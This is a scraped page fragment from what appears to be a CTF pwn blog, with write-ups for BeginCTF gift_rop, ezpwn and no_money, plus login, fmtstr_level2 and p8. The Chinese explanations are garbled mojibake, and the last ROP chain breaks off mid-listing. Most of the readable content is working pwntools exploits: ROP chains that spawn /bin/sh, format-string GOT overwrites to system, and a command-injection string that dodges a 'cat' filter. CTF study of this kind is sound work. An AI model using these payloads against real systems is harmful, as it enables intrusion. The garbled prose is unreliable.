&lt;p&gt;é™æ€ç¼–è¯‘çš„æ ˆæº¢å‡ºï¼Œå’Œå‰å‡ ç¯‡åšå®¢çš„p8å·®ä¸å¤šï¼Œè„šæœ¬ç¨å¾®ä¿®æ”¹ä¸‹å°±è¡Œï¼Œå†è€…å°±æ˜¯å…³é—­äº†æ ‡å‡†è¾“å‡ºå’Œé”™è¯¯æ ‡å‡†è¾“å‡ºï¼Œè¿™ä¸€ç‚¹FSCTFæœ‰é“ç±»ä¼¼çš„é¢˜ï¼Œé‚£é“é¢˜è¿˜banäº†catå’Œflagæ¥ç€ï¼Œç»•è¿‡æ–¹æ³•å°±æ˜¯åˆ©ç”¨&lt;code&gt;exec 1&amp;gt;&amp;amp;0&lt;/code&gt;æŒ‡ä»¤å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å…¥ï¼Œå†æ‰§è¡Œå‘½ä»¤ä¹Ÿèƒ½å›æ˜¾åˆ°ç»ˆç«¯&lt;br&gt;
expå¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

io = process(&amp;quot;./gift_rop&amp;quot;)
elf = ELF(&amp;quot;./gift_rop&amp;quot;)
from struct import pack

p = b&#39;&#39;
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000409f9e) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c50e0) # @ .data
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000448077) # pop rax ; ret
p += b&#39;/bin//sh&#39;
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000044a4f5) # mov qword ptr [rsi], rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000409f9e) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c50e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000043d1d0) # xor rax, rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000044a4f5) # mov qword ptr [rsi], rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000401f2f) # pop rdi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c50e0) # @ .data
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000409f9e) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c50e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000047f20b) # pop rdx ; pop rbx ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004c50e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x4141414141414141) # padding
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000448077) # pop rax ; ret
p += p64(59)
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000401ce4) # syscall

pay = b&#39;&#39;
for i in range(len(p)):
        pay += (ord(p[i:i+1])).to_bytes(1)
payload = b&#39;a&#39;*40 + pay

io.sendafter(b&#39;problem.\n&#39;, payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;ezpwn&#34;&gt;ezpwn&lt;/h1&gt;
&lt;p&gt;ä¿æŠ¤å…¨å¼€&lt;br&gt;
æŸ¥çœ‹ç¨‹åºé€»è¾‘&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708517102652.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
çœ‹è§èœå•è¿˜ä»¥ä¸ºæ˜¯å †é¢˜ï¼ˆ&lt;br&gt;
å…ˆçœ‹ç¬¬ä¸€ä¸ªé€‰é¡¹ï¼Œå‘ç°å­˜åœ¨æ•°ç»„æº¢å‡ºæ¼æ´ï¼Œmainå‡½æ•°å’Œåé—¨å‡½æ•°ç›¸å·®ä¸è¿œï¼Œåªéœ€ä¿®æ”¹ä¸€ä¸ªå­—èŠ‚ä¾¿å¯å¾—åˆ°shell&lt;/p&gt;
&lt;h2 id=&#34;æ³¨æ„&#34;&gt;æ³¨æ„ï¼š&lt;/h2&gt;
&lt;p&gt;1.è¯»å–æ•°æ®ç”¨çš„æ˜¯scanfå‡½æ•°ï¼Œæ‰€ä»¥å‘é€æ•°æ®éœ€è¦ç”¨sendline&lt;br&gt;
2.scanfå‡½æ•°çš„è¯è¾“å…¥123Nåªä¼šè¯»å–å‰é¢çš„123ï¼Œ&#39;N&#39;ä¿ç•™åœ¨ç¼“å†²åŒºä¸­ï¼Œè¢«åé¢çš„getcharå‡½æ•°è¯»å–&lt;br&gt;
expå¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./ezpwn&amp;quot;)
elf = ELF(&amp;quot;./ezpwn&amp;quot;)

#gdb.attach(p)

p.sendlineafter(b&#39;\n&#39;,b&#39;1&#39;)
p.sendlineafter(b&#39;\n&#39;,b&#39;552\x4E&#39;)
p.sendlineafter(b&#39;\n&#39;,b&#39;4&#39;)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;çœ‹wpå‘ç°è¿˜æœ‰å‘½ä»¤æ³¨å…¥çš„åšæ³•ï¼ŒæŸ¥äº†ä¸€ä¸‹å…³é”®çŸ¥è¯†ç‚¹å°±æ˜¯&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&#39;$(c&#39;&#39;at flag)&#39;                    &#39;&#39;è¡¨ç¤ºç©ºå­—ç¬¦ï¼Œå³c&#39;&#39;at = cat
$(cat flag)è¡¨ç¤ºæ‰§è¡Œcat flagå‘½ä»¤å¹¶å°†å…¶ç»“æœä½œä¸ºå˜é‡çš„å€¼
è¿™è¡Œä»£ç çš„ä½œç”¨æ˜¯æ‰§è¡Œcat flagå‘½ä»¤å¹¶å°†flagæ–‡ä»¶çš„å†…å®¹ä½œä¸ºå‚æ•°ä¼ é€’ç»™systemå‡½æ•°ã€‚
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿˜æ˜¯FSCTFé‚£é“é¢˜ç¦ç”¨äº†catæä¾›äº†æ€è·¯ï¼Œ&lt;code&gt;&#39;$(tac flag)&#39;&lt;/code&gt;å‘½ä»¤ä¹Ÿèƒ½è¾“å‡ºflag&lt;/p&gt;
&lt;h1 id=&#34;no_money&#34;&gt;no_money&lt;/h1&gt;
&lt;p&gt;æŸ¥çœ‹ä¿æŠ¤&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708519762960.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æŸ¥çœ‹é€»è¾‘&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708519790405.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708519805390.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå°±æ˜¯ä¸ªè¢«banæ‰$ç¬¦å·çš„æ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ŒæŠŠtargetæ”¹ä¸ºé0æ•°å³å¯å¾—åˆ°shellï¼Œä¸»è¦çŸ¥è¯†ç‚¹å°±æ˜¯&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;%3$n = %c%c%n
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç”±äºå¼€äº†PIEï¼Œæ‰€ä»¥å…ˆæ³„éœ²ELFæ–‡ä»¶åœ°å€&lt;br&gt;
expå¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./no_money&amp;quot;)
elf = ELF(&amp;quot;./no_money&amp;quot;)

gdb.attach(p)

p.sendlineafter(b&#39;:&#39;, b&#39;%c&#39;*20 + b&#39;%p&#39;)
p.recvuntil(b&#39;0x&#39;)
base = int(p.recv(12), 16) - 0x1277
target = base + 0x404C

p.sendlineafter(b&#39;:&#39;, b&#39;%c&#39;*12 + b&#39;a&#39;*8 + b&#39;%n&#39;.ljust(8, b&#39;a&#39;) + p64(target))

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">Beginctf(éƒ¨åˆ†wp)</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/loginfei-zhan-shang-ge-shi-hua-zi-fu-chuan/"" data-c="
          &lt;h1 id=&#34;æŸ¥çœ‹ä¿æŠ¤&#34;&gt;æŸ¥çœ‹ä¿æŠ¤&lt;/h1&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708494496233.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h1 id=&#34;æŸ¥çœ‹ç¨‹åºé€»è¾‘&#34;&gt;æŸ¥çœ‹ç¨‹åºé€»è¾‘&lt;/h1&gt;
&lt;p&gt;å…ˆè¾“å…¥nameï¼Œç„¶åè·³åˆ°ä¸»é€»è¾‘&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708494579640.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°å­˜åœ¨éæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¹¶ä¸”ä¸å­˜åœ¨åé—¨å‡½æ•°&lt;/p&gt;
&lt;h1 id=&#34;æ”»å‡»æ€è·¯&#34;&gt;æ”»å‡»æ€è·¯&lt;/h1&gt;
&lt;p&gt;1.æ³„éœ²libcåŸºåœ°å€å’Œæ ˆåœ°å€&lt;br&gt;
2.åˆ©ç”¨ebpé“¾å°†printfçš„å®é™…åœ°å€æ”¹ä¸ºsystemï¼ˆå…ˆå°†ebp+4å’Œebp+8çš„ä½ç½®å†™å…¥printfå‡½æ•°çš„gotè¡¨åœ°å€å’Œgotè¡¨+2çš„åœ°å€ï¼Œåˆ†ä¸¤æ¬¡ä¿®æ”¹å®é™…åœ°å€ï¼Œç¬¬ä¸€æ¬¡æ”¹å4ä½ï¼ˆåå…­è¿›åˆ¶ï¼‰ï¼Œç¬¬ä¸€æ¬¡æ”¹å‰4ä½ï¼‰&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708494770183.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
3.å†™å…¥/bin/shå¾—åˆ°shell&lt;/p&gt;
&lt;h1 id=&#34;æ³¨æ„&#34;&gt;æ³¨æ„ï¼š&lt;/h1&gt;
&lt;p&gt;ä¸€å®šè¦ä¸€æ¬¡æ€§æŠŠprintfå‡½æ•°å®é™…åœ°å€æ”¹æ‰ï¼Œä¸ç„¶åç»­è°ƒç”¨printfå‡½æ•°æ—¶ä¼šè°ƒç”¨å…¶ä»–å‡½æ•°ï¼Œä¹Ÿä¼šç‚¸&lt;/p&gt;
&lt;h1 id=&#34;expå¦‚ä¸‹&#34;&gt;expå¦‚ä¸‹ï¼š&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;i386&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./login&amp;quot;)
elf = ELF(&amp;quot;./login&amp;quot;)
p.sendline(&amp;quot;name&amp;quot;)

printf_got = 0x804B014

#sys
p.sendlineafter(&amp;quot;: \n&amp;quot;,&amp;quot;%15$p&amp;quot;)
p.recvuntil(&amp;quot;0x&amp;quot;)
__libc_start_main = int(p.recv(8),16) - 245
print(&amp;quot;main = &amp;quot;,hex(__libc_start_main))
base = __libc_start_main - 0x1EDF0
sys = base + 0x45830
print(&amp;quot;sys = &amp;quot;,hex(sys))

#stack
p.sendlineafter(&amp;quot;!\n&amp;quot;,&amp;quot;%6$p&amp;quot;)
p.recvuntil(&amp;quot;0x&amp;quot;)
stack = int(p.recv(8),16)
print(&amp;quot;stack = &amp;quot;,hex(stack))
ebp = stack - 16

s1 = (ebp + 4) &amp;amp; 0xffff
payload = b&#39;%&#39; + str(s1).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%6$hn&#39;
p.sendlineafter(&amp;quot;!\n&amp;quot;,payload)
p.sendlineafter(&amp;quot;!\n&amp;quot;,&amp;quot;%45076c%10$hn&amp;quot;)

s2 = (ebp + 8) &amp;amp; 0xffff
payload = b&#39;%&#39; + str(s2).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%6$hn&#39;
p.sendlineafter(&amp;quot;!\n&amp;quot;,payload)
p.sendlineafter(&amp;quot;!\n&amp;quot;,&amp;quot;%45078c%10$hn&amp;quot;)

x1 = sys &amp;amp; 0xffff
payload = b&#39;%&#39; + str(x1).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%7$hn&#39;
x2 = (sys &amp;gt;&amp;gt; 16) &amp;amp; 0xffff
payload += b&#39;%&#39; + str(0x10000 + x2 - x1).encode(&amp;quot;utf-8&amp;quot;) + b&#39;c&#39; + b&#39;%8$hn&#39;
p.sendlineafter(&amp;quot;!\n&amp;quot;,payload)

p.sendafter(&amp;quot;!\n&amp;quot;,&amp;quot;/bin/sh&amp;quot;)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œç»“æœå¦‚ä¸‹&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708495217411.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">loginï¼ˆéæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼‰</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/fmtstr_level2/"" data-c="
          &lt;h1 id=&#34;æŸ¥çœ‹ä¿æŠ¤&#34;&gt;æŸ¥çœ‹ä¿æŠ¤&lt;/h1&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708318844529.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h1 id=&#34;æŸ¥çœ‹ç¨‹åºé€»è¾‘&#34;&gt;æŸ¥çœ‹ç¨‹åºé€»è¾‘&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708318883882.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
åªæœ‰ä¸€æ¬¡çš„æ”¹æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œçœ‹åˆ°&lt;code&gt;puts(&amp;quot;Okk,try to hack it;sh&amp;quot;);&lt;/code&gt;ï¼Œç»™å‡ºäº†æš—ç¤ºï¼ŒæŠŠputså‡½æ•°gotè¡¨æ”¹ä¸ºsystemå‡½æ•°å³å¯å¾—åˆ°shell&lt;/p&gt;
&lt;h1 id=&#34;è¡¥fmtstr_payload&#34;&gt;è¡¥ï¼šfmtstr_payload&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;offset(int)ï¼šæ§åˆ¶çš„ç¬¬ä¸€ä¸ªæ ¼å¼åŒ–ç¨‹åºçš„åç§»é‡&lt;br&gt;
writes(dic)ï¼šæ ¼å¼ä¸º{addr:value , addr2:value2}ï¼Œç”¨äºå¾€addré‡Œå†™å…¥valueçš„å€¼&lt;br&gt;
numbwritten(int)ï¼šå·²ç»ç”±printfå‡½æ•°å†™å…¥(è¾“å‡ºåˆ°ç»ˆç«¯)çš„å­—èŠ‚æ•°&lt;br&gt;
write_size(str)ï¼šå¿…é¡»æ˜¯byteã€shortæˆ–intã€‚ï¼ˆhhnï¼Œhnï¼Œnï¼‰&lt;/p&gt;
&lt;h1 id=&#34;æ”»å‡»æ€è·¯&#34;&gt;æ”»å‡»æ€è·¯ï¼š&lt;/h1&gt;
&lt;p&gt;1.åˆ©ç”¨ç¬¬ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²libcåŸºåœ°å€ï¼Œå¹¶å°†fini_arrayæ”¹ä¸ºmainå‡½æ•°ï¼Œä½¿ç¨‹åºå†æ¬¡æ‰§è¡Œmainå‡½æ•°&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708322154564.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
åœ¨fmtstr_payloadå‰ï¼ˆ0x20å‰æœ‰0x11ä¸ªå­—èŠ‚ï¼Œåœ°å€+å¡«å……å­—èŠ‚ï¼‰&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708322323605.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
2.åˆ©ç”¨ç¬¬äºŒæ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²å°†putså‡½æ•°gotè¡¨æ”¹ä¸ºsystem&lt;br&gt;
expå¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./fmtstr_level2&amp;quot;)
elf = ELF(&amp;quot;./fmtstr_level2&amp;quot;)

fini = 0x4031F0
main = 0x40122E
puts = 0x4033F0

#gdb.attach(p)
payload = b&amp;quot;%45$paaa&amp;quot; + fmtstr_payload(7,{fini:elf.sym.main},numbwritten=0x11)
p.sendafter(&amp;quot;ID\n&amp;quot;,payload)

p.recvuntil(&amp;quot;0x&amp;quot;)
__libc_start_main = int(p.recv(12),16) - 243
print(&amp;quot;__libc_start_main = &amp;quot;,hex(__libc_start_main))
base = __libc_start_main - 0x26FC0
system = base + 0x55410

payload = fmtstr_payload(6,{puts:system})
p.sendafter(&amp;quot;ID\n&amp;quot;,payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œç»“æœå¦‚ä¸‹&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708322506294.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">fmtstr_level2(æ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²)</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/p8/"" data-c="
          &lt;h1 id=&#34;é€šè¿‡æŸ¥æ‰¾å­—ç¬¦ä¸²æ‰¾åˆ°ç¨‹åºä¸»é€»è¾‘&#34;&gt;é€šè¿‡æŸ¥æ‰¾å­—ç¬¦ä¸²æ‰¾åˆ°ç¨‹åºä¸»é€»è¾‘&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708313279313.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ˜“åˆ†æå‡ºreadå‡½æ•°å’Œprintå‡½æ•°ï¼ˆputså‡½æ•°ï¼‰å·®ä¸å¤šé‚£ä¸ªæ„æ€&lt;br&gt;
ä¸Šé¢çš„sub_400BF0å‡½æ•°åº”è¯¥æ˜¯ä¸€ä¸ªè®¡æ—¶å™¨ï¼Œé˜²æ­¢åŠ¨æ€è°ƒè¯•çš„&lt;/p&gt;
&lt;h2 id=&#34;è®¡æ—¶å™¨&#34;&gt;è®¡æ—¶å™¨&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1709725920685.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ç›´æ¥ä¿®æ”¹æœºå™¨ç ä¸Šçš„æ—¶é—´ï¼Œå®ç°ç»•è¿‡&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708317846276.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°v1æ²¡æœ‰æº¢å‡ºï¼Œè²Œä¼¼æ²¡å•¥æ¼æ´ï¼Œç‚¹å‡»sub_400C40å‡½æ•°è¿›å»çœ‹çœ‹&lt;/p&gt;
&lt;h1 id=&#34;sub_400c40å‡½æ•°&#34;&gt;sub_400C40å‡½æ•°&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708313531502.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°ä¸»è¦é€»è¾‘å°±æ˜¯æŠŠè¾“å…¥å¤åˆ¶åˆ°v9é‡Œï¼Œç„¶åæŠŠv9ä¸­çš„æ¯ä¸ªå­—èŠ‚å’Œ0x66å¼‚æˆ–ï¼Œæ­¤æ—¶å‘ç°v9åªä¸rbpç›¸å·®50ä¸ªå­—èŠ‚ï¼Œè€Œè¾“å…¥çš„å¯ä»¥æœ‰0x200ä¸ªå­—èŠ‚ï¼Œå‘ç”Ÿäº†æº¢å‡ºï¼Œæ‰€ä»¥åªè¦æŠŠæ„é€ çš„ROPé“¾å’Œ0x66å¼‚æˆ–åå‘å‡ºï¼Œå°±å’Œæ­£å¸¸çš„æ ˆæº¢å‡ºä¸€æ ·äº†ï¼ˆå¹¶ä¸”è¯¥ç¨‹åºéå¸¸çš„å¤§ï¼Œåº”è¯¥æ˜¯é™æ€ç¼–è¯‘çš„ï¼Œæœ‰éå¸¸ä¸°å¯Œçš„ROPï¼Œå¹¶ä¸”å¯ä»¥ç›´æ¥åˆ©ç”¨ROPgadgetåˆ¶é€ ROPé“¾ï¼‰&lt;/p&gt;
&lt;h1 id=&#34;åˆ¶é€ ropé“¾&#34;&gt;åˆ¶é€ ROPé“¾&lt;/h1&gt;
&lt;h2 id=&#34;æ³¨æ„&#34;&gt;æ³¨æ„ï¼š&lt;/h2&gt;
&lt;p&gt;å·¥å…·ç”Ÿæˆçš„ä»£ç å’Œæˆ‘ä»¬æ—¥å¸¸ä½¿ç”¨çš„ä»£ç æ ¼å¼å’Œé£æ ¼ä¸Šéƒ½æœ‰ä¸€å®šå·®è·ï¼Œä»structåŒ…ä¸­å¯¼å…¥çš„packå‡½æ•°ä¹Ÿä¼šå’Œpwntoolsä¸­çš„packèµ·å†²çªï¼Œå¦‚æœä¸€å®šè¦ä½¿ç”¨structçš„packï¼Œå°±åœ¨å¯¼å…¥pwntoolsåå†å¯¼å…¥structï¼Œè¿™æ ·å°±å¯ä»¥è¦†ç›–æ‰pack&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ROPgadget --binary p8 --ropchain
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¾—åˆ°&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python3
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = b&#39;&#39;

p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e0) # @ .data
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000449b9c) # pop rax ; ret
p += b&#39;/bin//sh&#39;
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000444f00) # xor rax, rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004006e6) # pop rdi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e0) # @ .data
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000044c156) # pop rdx ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000444f00) # xor rax, rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
